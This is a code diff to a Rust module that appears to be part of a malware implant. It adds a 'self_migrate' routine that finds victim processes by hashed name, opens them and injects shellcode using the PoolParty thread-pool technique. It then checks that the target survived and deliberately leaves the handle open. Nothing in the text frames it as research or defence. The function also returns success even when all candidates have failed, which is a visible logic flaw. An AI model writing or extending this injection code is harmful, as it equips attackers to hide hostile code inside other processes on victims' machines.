@@ -1,3 +1,4 @@
+use crate::core::injection::poolparty;
 use crate::core::types::*;
 use crate::debug;
 use crate::core::hashes;
@@ -107,7 +108,7 @@ unsafe fn find_processes_by_hash(target_hash: u32, required_session: u32) -> [us
                 };
                 hash = ((hash << 5).wrapping_add(hash)).wrapping_add(c as u32);
             }
-            hash ^= hashes::HASH_SEED;
+            hash ^= hashes::HASH_XOR;
 
             if hash == target_hash {
                 // Check session ID
@@ -166,8 +167,8 @@ unsafe fn open_process(pid: usize) -> Option<HANDLE> { unsafe {
 
 
 
-pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
-    if sehllcode.is_empty() {
+pub unsafe fn self_migrate(shellcode: &[u8]) -> bool { unsafe {
+    if shellcode.is_empty() {
         debug!("[MIGRATE] No Shellcode to inject");
         return false;
     }
@@ -185,7 +186,7 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
         for &pid in pids.iter().filter(|&&p| p != 0) {
             debug!("[MIGRATE]   Attempting PID {}", pid);
 
-            let _handle = match open_process(pid) {
+            let handle = match open_process(pid) {
                 Some(h) => h,
                 None => {
                     debug!("[MIGRATE]   Failed to open PID {}", pid);
@@ -195,10 +196,37 @@ pub unsafe fn self_migrate(sehllcode: &[u8]) -> bool { unsafe {
 
             // TODO: PoolParty + MirrorGate
             debug!("[MIGRATE] Injecting via PoolParty into PID {}", pid);
-            let _success = todo!();
+            let success = poolparty::migrate(shellcode, handle, pid);
 
+            if !success {
+                debug!("[MIGRATE]   PoolParty injection failed for PID {}", pid);
+                nt::nt_close(handle);
+                continue;
+            }
+
+            // give thread pool 500ms to pick up the packet
+            let mut settle: i64 = -5000000; // 500ms 
+            nt::nt_wait_for_single_object(
+                handle, 
+                0u8,
+                &mut settle as *mut _ as *mut c_void,
+            );
+
+            if !crate::core::injection::is_process_alive(handle) {
+                debug!("[MIGRATE]   Target died after injection (PID {})", pid);
+                nt::nt_close(handle);
+                continue;
+            }
+
+            debug!("[+] Migration success: shellcode running in PID {}", pid);
+
+
+            // We do not close the handle and let the OS clean it up when we exit
+            // cuz closing it now maybe cause issues if the injection is still settling
+            return true;
         }
     }
 
+    debug!("[MIGRATION] All candidates exhusted, migration failed");
     true
 }}
